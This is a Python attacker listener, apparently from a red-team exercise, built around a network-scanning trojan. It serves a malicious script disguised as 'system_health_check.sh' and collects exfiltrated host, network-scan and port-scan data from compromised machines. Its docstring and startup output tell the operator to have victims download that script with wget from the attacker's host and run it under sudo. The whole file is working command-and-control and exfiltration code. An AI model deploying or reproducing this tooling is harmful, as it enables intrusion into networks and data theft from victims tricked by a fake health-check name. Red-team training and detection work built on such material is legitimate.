#!/usr/bin/env python3
"""
CYBERFORTRESS REDOPS - Attacker Listener
=========================================
Receives exfiltrated network scan data from compromised hosts.

Usage:
    python3 listener.py
    python3 listener.py --port 8080

On victim Ubuntu:
    wget http://ATTACKER:8080/system_health_check.sh
    chmod +x system_health_check.sh
    sudo ./system_health_check.sh
"""

import http.server
import socketserver
import json
import base64
import argparse
import os
from datetime import datetime

# Configuration
DEFAULT_PORT = 8080
OUTPUT_DIR = "received_data"

class ExfilHandler(http.server.SimpleHTTPRequestHandler):
    """Handle incoming exfiltrated data."""
    
    def log_message(self, format, *args):
        """Custom logging."""
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {args[0]}")
    
    def do_POST(self):
        """Handle POST requests with exfiltrated data."""
        if self.path == "/upload":
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                self.save_exfil_data(data)
                
                # Send success response
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status": "ok"}')
                
            except Exception as e:
                print(f"[-] Error processing data: {e}")
                self.send_response(500)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_GET(self):
        """Serve the trojan script."""
        if self.path == "/system_health_check.sh":
            script_path = os.path.join(os.path.dirname(__file__), "system_health_check.sh")
            if os.path.exists(script_path):
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                with open(script_path, 'rb') as f:
                    self.wfile.write(f.read())
                print(f"[+] Served trojan script to {self.client_address[0]}")
            else:
                self.send_response(404)
                self.end_headers()
        else:
            super().do_GET()
    
    def save_exfil_data(self, data):
        """Save exfiltrated data to file."""
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        
        hostname = data.get('hostname', 'unknown')
        ip = data.get('ip', 'unknown')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        print("\n" + "="*60)
        print(f"[+] RECEIVED DATA FROM COMPROMISED HOST")
        print("="*60)
        print(f"    Hostname: {hostname}")
        print(f"    IP: {ip}")
        print(f"    OS: {data.get('os', 'unknown')}")
        print(f"    Timestamp: {data.get('timestamp', 'unknown')}")
        
        # Decode and save scan results
        if data.get('scan_results'):
            scan_data = base64.b64decode(data['scan_results']).decode('utf-8', errors='ignore')
            hosts = [h.strip() for h in scan_data.split('\n') if h.strip()]
            print(f"    Discovered hosts: {len(hosts)}")
            for host in hosts[:10]:  # Show first 10
                print(f"      - {host}")
            if len(hosts) > 10:
                print(f"      ... and {len(hosts) - 10} more")
            
            # Save to file
            with open(f"{OUTPUT_DIR}/{hostname}_{timestamp}_hosts.txt", 'w') as f:
                f.write(scan_data)
        
        # Decode and save port scan
        if data.get('port_scan'):
            port_data = base64.b64decode(data['port_scan']).decode('utf-8', errors='ignore')
            with open(f"{OUTPUT_DIR}/{hostname}_{timestamp}_ports.txt", 'w') as f:
                f.write(port_data)
            print(f"    Port scan: Saved to {OUTPUT_DIR}/")
        
        # Save full JSON
        with open(f"{OUTPUT_DIR}/{hostname}_{timestamp}_full.json", 'w') as f:
            # Include decoded data
            data['scan_results_decoded'] = base64.b64decode(data.get('scan_results', '')).decode('utf-8', errors='ignore') if data.get('scan_results') else ''
            data['port_scan_decoded'] = base64.b64decode(data.get('port_scan', '')).decode('utf-8', errors='ignore') if data.get('port_scan') else ''
            json.dump(data, f, indent=2)
        
        print("="*60 + "\n")


def print_banner():
    print("""
╔═══════════════════════════════════════════════════════════════════╗
║     NETWORK SCANNING TROJAN - ATTACKER LISTENER                   ║
║     MITRE ATT&CK: T1046 - Network Service Scanning               ║
║                   T1041 - Exfiltration Over C2 Channel           ║
╚═══════════════════════════════════════════════════════════════════╝
    """)


def main():
    parser = argparse.ArgumentParser(description='Attacker listener for network scan exfiltration')
    parser.add_argument('-p', '--port', type=int, default=DEFAULT_PORT, help='Port to listen on')
    args = parser.parse_args()
    
    print_banner()
    
    # Get local IP
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
    except:
        local_ip = '0.0.0.0'
    finally:
        s.close()
    
    print(f"[*] Starting listener on port {args.port}")
    print(f"[*] Data will be saved to: {OUTPUT_DIR}/")
    print("")
    print("[*] On victim Ubuntu, run:")
    print(f"    wget http://{local_ip}:{args.port}/system_health_check.sh")
    print(f"    chmod +x system_health_check.sh")
    print(f"    sudo ./system_health_check.sh")
    print("")
    print("[*] Waiting for connections...")
    print("")
    
    with socketserver.TCPServer(("", args.port), ExfilHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")


if __name__ == "__main__":
    main()
